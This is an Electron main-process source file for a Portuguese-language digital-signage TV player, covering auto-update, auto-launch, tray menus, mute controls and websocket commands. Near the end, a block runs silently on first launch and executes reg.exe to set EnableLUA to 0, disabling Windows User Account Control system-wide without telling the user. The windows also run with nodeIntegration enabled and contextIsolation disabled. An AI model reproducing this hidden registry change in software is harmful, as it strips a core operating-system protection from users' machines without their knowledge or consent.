const { app, Menu, BrowserWindow, ipcMain, shell, Tray } = require('electron');
const AutoLaunch = require('auto-launch');
const path = require('path');
const QRCode = require('qrcode');
const { exec } = require('child_process');
const DAO = require(path.join(app.getAppPath(), "Repository", "DB.js"));
const Commun = require(path.join(app.getAppPath(), "Domain", "Commun", "commun.js"));
const WebSocketService = require(path.join(app.getAppPath(), "Domain", "Service", "websocketClient.js"));
const { autoUpdater, AppUpdater } = require("electron-updater");
var window = null, QrCodeLinkTv = null, appIcon = null, muted = false;

///Auto Updater
autoUpdater.autoDownload = true;
autoUpdater.autoInstallOnAppQuit = true;
///Auto Updater

///Start With Windows
var AutoLauncher = new AutoLaunch({
	name: app.getName(),
	path: app.getPath('exe'),
});
AutoLauncher.enable();
///Start With Windows

function sendDataToFront(type, message) {
    window.webContents.send(type, message);
}

function handleMessages(type, callback) {
    ipcMain.handle(type, callback);
}

function GetQrCodeLinkTv(){
  return new Promise((resolve)=>{
    if(!QrCodeLinkTv){
      QRCode.toDataURL(`${DAO.Config.URL_SITE}/?ng=dashboard/mobile/${DAO.TvCode}`, function (err, url) {
        QrCodeLinkTv = url;
        resolve(QrCodeLinkTv);
      });
    }
    else
      resolve(QrCodeLinkTv);
  })
}

async function createWindow () {
  setTimeout(async ()=>{
    await DAO.ClearCertainData();
  }, 1000);

  window = new BrowserWindow({
    width: 800,
    height: 600,
    icon: path.join(app.getAppPath(), "Domain", "Src", "img", "icon.ico"),
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
      devTools: true,
    },
    fullscreenable: true,
    autoHideMenuBar: true,
  });
  window.fullScreen = true;
  window.maximize();
  loadScreenApp();
  WebSocketService.StartSocket();

  appIcon = new Tray(path.join(app.getAppPath(), "Domain", "Src", "img", "icon.ico"));
  appIcon.setToolTip(app.getName());
  setAppContextMenu();
  setWindowsMenuTemplate();
  if(await DAO.DB.get('IsAppMuted') === true){
    MuteWindow();
  }
  else{
    UnmuteWindow();
  }
}

async function setAppContextMenu() {
  appIcon.setContextMenu(
    Menu.buildFromTemplate([
        {
          label: app.getName(), type: 'normal', click: () => { }
        },
        {
          label: `Código: ${await DAO.GetTvCode()}`, type: 'normal', click: async () => {
            Commun.copiarTexto(await DAO.GetTvCode());
          }
        },
        {
          label: `Versão Atual: ${app.getVersion()}`, type: 'normal', click: () => { }
        },
        {
          label: "Procurar por Atualização", type: 'normal', click: () => {
            CheckForUpdates();
          }
        },
        { type: 'separator' },
        {
          label: "Abrir Local Da Time Line", type: 'normal', click: () => {
           shell.openPath(path.join(DAO.DB_DIR, 'Storage', 'Timelines'));
          }
        },
        { type: 'separator' },
        {
          label: muted ? "Desmutar Aplicativo" : "Mutar Aplicativo", type: 'normal', click: async () => {
           await ToggleMuteWindow();
          }
        },
        {
          label: "Reiniciar Aplicativo", type: 'normal', click: () => {
            app.relaunch();
            app.exit();
            process.exit();
          }
        },
        {
          label: "Atualizar Tela", type: 'normal', click: () => {
            window.show();
            window.maximize();
            window.reload();
          }
        },
        {
          label: "Sair", type: 'normal', click: async () => {
            app.exit();
            process.exit();
          }
        }
      ])
  );
}

async function setWindowsMenuTemplate() {
  var isMac = process.platform === 'darwin';

  var template = [
    // { role: 'appMenu' }
    ...(isMac
      ? [{
          label: app.name,
          submenu: [
            { role: 'about' },
            { type: 'separator' },
            { role: 'services' },
            { type: 'separator' },
            { role: 'hide' },
            { role: 'hideOthers' },
            { role: 'unhide' },
            { type: 'separator' },
            { role: 'quit' }
          ]
        }]
      : []
    ),
    // { role: 'fileMenu' }
    {
      label: 'Audio',
      submenu: [
        {
          label: muted ? "Desmutar Aplicativo" : "Mutar Aplicativo",
          type: 'normal',
          click: async () => {
            await ToggleMuteWindow();
          }
        },
      ]
    },
    // { role: 'editMenu' }
    {
      label: 'Edit',
      submenu: [
        { role: 'undo' },
        { role: 'redo' },
        { type: 'separator' },
        { role: 'cut' },
        { role: 'copy' },
        { role: 'paste' },
        ...(isMac
          ? [
              { role: 'pasteAndMatchStyle' },
              { role: 'delete' },
              { role: 'selectAll' },
              { type: 'separator' },
              {
                label: 'Speech',
                submenu: [
                  { role: 'startSpeaking' },
                  { role: 'stopSpeaking' }
                ]
              }
            ]
          : [
              { role: 'delete' },
              { type: 'separator' },
              { role: 'selectAll' }
            ])
      ]
    },
    // { role: 'viewMenu' }
    {
      label: 'View',
      submenu: [
        { role: 'reload' },
        { role: 'forceReload' },
        { role: 'toggleDevTools' },
        { type: 'separator' },
        { role: 'resetZoom' },
        { role: 'zoomIn' },
        { role: 'zoomOut' },
        { type: 'separator' },
        { role: 'togglefullscreen' }
      ]
    },
    // { role: 'windowMenu' }
    {
      label: 'Window',
      submenu: [
        { role: 'minimize' },
        { role: 'zoom' },
        ...(isMac
          ? [
              { type: 'separator' },
              { role: 'front' },
              { type: 'separator' },
              { role: 'window' }
            ]
          : [
              { role: 'close' }
            ]
          )
      ]
    },
    {
      role: 'help',
      submenu: [
        {
          label: 'Learn More',
          click: async () => {
            const { shell } = require('electron')
            await shell.openExternal('https://electronjs.org')
          }
        }
      ]
    }
  ]
  Menu.setApplicationMenu(Menu.buildFromTemplate(template));
}

async function MuteWindow() {
  if (window) {
    window.webContents.setAudioMuted(true);
    muted = true;
    await DAO.DB.set('IsAppMuted', muted);
    //console.log('Áudio da janela está mutado');
    setAppContextMenu();
    setWindowsMenuTemplate();
  }
}

async function UnmuteWindow() {
  if (window) {
    window.webContents.setAudioMuted(false);
    muted = false;
    await DAO.DB.set('IsAppMuted', muted);
    //console.log('Áudio da janela está desmutado');
    setAppContextMenu();
    setWindowsMenuTemplate();
  }
}

async function ToggleMuteWindow() {
  if (window) {
    muted = !muted;
    window.webContents.setAudioMuted(muted);
    await DAO.DB.set('IsAppMuted', muted);
    //console.log(`Áudio da janela agora está: ${muted ? 'mutado' : 'desmutado'}`);
    setAppContextMenu();
    setWindowsMenuTemplate();
  }
}

Commun.CheckChromiumDependency(async (data)=>{
  sendDataToFront("DataLinkTv", {
    qrCodeUrl: await GetQrCodeLinkTv(),
    tvCode: DAO.TvCode,
    version: DAO.Package.version,
    StatusChromiumDependency: data && data.percentage ? data.percentage : DAO.DB.get('StatusChromiumDependency')
  });
});

handleMessages('GetDataLinkTv', async (event, data)=>{
  sendDataToFront("DataLinkTv", {
    qrCodeUrl: await GetQrCodeLinkTv(),
    tvCode: DAO.TvCode,
    version: DAO.Package.version,
    porcentagemUpdateAppOwnlaod: DAO.DB.get('DownloadUpdateApp'),
    StatusChromiumDependency: DAO.DB.get('StatusChromiumDependency')
  });
});

handleMessages('mute-ElectronApp', async (event, data)=>{
  MuteWindow();
});

handleMessages('unmute-ElectronApp', async (event, data)=>{
  UnmuteWindow();
});

handleMessages('toggle-mute-electronApp', async (event, data)=>{
  if (window && data.muted !== undefined) {
      ToggleMuteWindow(data.muted);
  }
});

handleMessages('SaveNowBlockReproduct', async (event, data)=>{

});

handleMessages('CreateLogRepoducaoTv', async (event, data)=>{

});

handleMessages('GetDataPlayer', async (event, data)=>{
  return new Promise( async resolve => {
    let dt = null;
    let dtNew = await DAO.TIMELINE.get('NewDataPlayer');
    if(dtNew == null || dtNew == "null" || dtNew == ""){
        dt = await DAO.TIMELINE.get('DataPlayer');
    }else{
        dt = dtNew;
        await DAO.TIMELINE.set('DataPlayer', dtNew);
        await DAO.TIMELINE.set('NewDataPlayer', null);
    }
    if(dt == "" || dt == null || dt == "null")
        dt = "no_data";
    resolve(dt);
  });
});

handleMessages('GetUpdate', async (event, data)=>{
    return new Promise( async (resolve) => {
      let stateScreen = DAO.DB.get('ReloadScreen');
      let playerState = DAO.DB.get('PlayerState');
      let update = DAO.DB.get('UpdateDataPlayer');
      let conectionServer = DAO.DB.get('IsConnected');
      let ststusDependencia = DAO.DB.get('StatusChromiumDependency');
      let UpdateDataPlayerNoReload = DAO.DB.get('UpdateDataPlayerNoReload');

      if(conectionServer != true){
          DAO.DB.set('PlayerState', 'true');
          playerState = "PLAY";
      }

      let data = {
          playerState: playerState,
          stateScreen: stateScreen,
          tvCode: DAO.TvCode,
          date: DAO.DB.get('DataDownload_timeline'),
          porcentagemDOwnlaod: DAO.DB.get('DownloadPercentage'),
          porcentagemUpdateAppOwnlaod: DAO.DB.get('DownloadUpdateApp'),
          update: update,
          randomReproduction: DAO.DB.get('RandomReproduction'),
          infoTv: DAO.DB.get('infoTv'),
          ststusDependencia: ststusDependencia,
          version: DAO.Package.version,
          UpdateDataPlayerNoReload: UpdateDataPlayerNoReload,
      }
      if(stateScreen === true) await DAO.DB.set('ReloadScreen', false);
      if(update === true) DAO.DB.set('UpdateDataPlayer', false);
      if(UpdateDataPlayerNoReload === true) DAO.DB.set('UpdateDataPlayerNoReload', false);
      resolve(data);
    });
});

WebSocketService.Receiver(async (data)=>{
  switch(data.code){

    case "update_screen":
      loadScreenApp(true);
    break;

    case "reload_screen":
      window.reload();
    break;

    case "reload_app":
      app.relaunch();
      app.exit();
    break;

    case "data_tv":
      loadScreenApp(true);
    break;

    case "CHECK_APP_UPDATES":
      CheckForUpdates();
    break;

    case "MUTE_APP":
      MuteWindow();
    break;

    case "UNMUTE_APP":
      UnmuteWindow();
    break;

    case "TOGGLE_MUTE_APP":
      ToggleMuteWindow();
    break;

    case "CHECK_APP_UPDATES":
      CheckForUpdates();
    break;

    default:
      console.log(data);
    break;
  }
});

async function loadScreenApp(noLoadIsLoaded = false){
  let screenNow = DAO.DB.get('ScreenNow');
  let dataTv = DAO.DB.get('DataTv');
  if(DAO.DB.get('IsLinkedTv') === true && dataTv){
    if(dataTv.situacao === "INATIVO")
      setScreen = path.join(app.getAppPath(), "Domain", "Views", "inativeTv.html");
    else
      setScreen = path.join(app.getAppPath(), "Domain", "Views", "player.html");
  }
  else{
    setScreen = path.join(app.getAppPath(), "Domain", "Views", "linkTv.html");
  }
  if(screenNow != setScreen || noLoadIsLoaded == false){
    await DAO.DB.set('ScreenNow', setScreen);
    window.loadFile(setScreen);
  }
}

///Auto Updater
autoUpdater.on("update-available", async (info) => {
  await DAO.DB.set('DownloadUpdateApp', "Atualização disponível, Por favor aguarde o processo de atualização ser concluído.");
  autoUpdater.downloadUpdate();
});

autoUpdater.on('download-progress', async (info) => {
  if(info.percent) {
    let percent = `${info.percent.toString().split('.')[0]}.${info.percent.toString().split('.')[1].slice(0, 2)}`
    await DAO.DB.set('DownloadUpdateApp', "Baixando atualização: " + percent + "%");
  }
  else{
    await DAO.DB.set('DownloadUpdateApp', "Baixando Atualização, Por favor aguarde o processo ser concluído.");
  }
});

autoUpdater.on("update-downloaded", async (event, releaseNotes, releaseName) => {
  await DAO.DB.set('DownloadUpdateApp', "Atualização baixada, Por favor aguarde o processo de instalação da atualização ser concluído.");
  setTimeout(async () => {
    autoUpdater.quitAndInstall(false, true);
    window.close();
    app.quit();
    await DAO.DB.set('DownloadUpdateApp', null);
    process.exit();
  }, 5000);
});

autoUpdater.on("update-not-available", async (info) => {
  await DAO.DB.set('DownloadUpdateApp', "O aplicativo já está na versão mais recente.");
  setTimeout(async () => {
    await DAO.DB.set('DownloadUpdateApp', null);
  }, 5000);
});

autoUpdater.on("error", async info => {
  await DAO.DB.set('DownloadUpdateApp', null);
});
///Auto Updater

async function CheckForUpdates() {
  await DAO.DB.set('DownloadUpdateApp', "Procurando por atualização...");
  autoUpdater.checkForUpdates();
}

app.whenReady().then(async () => {
  Commun.checkTimeLineFilesToDelete();
  Commun.DeleteOldTimeLine();
  Commun.DeleteAllFilesInstagram();

  createWindow();
  CheckForUpdates();

  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
      createWindow();
    }
  });
});

if(DAO.DB.get('setWarningProcessOff') != true ){
    let command = `C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f`;
    var removeWarninProcess = exec(command, (err, stdout, stderr) => { });
    setTimeout(()=>{
        DAO.DB.set('setWarningProcessOff', true);
        process.kill(removeWarninProcess.pid);
    }, 5000);
};

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit()
  }
});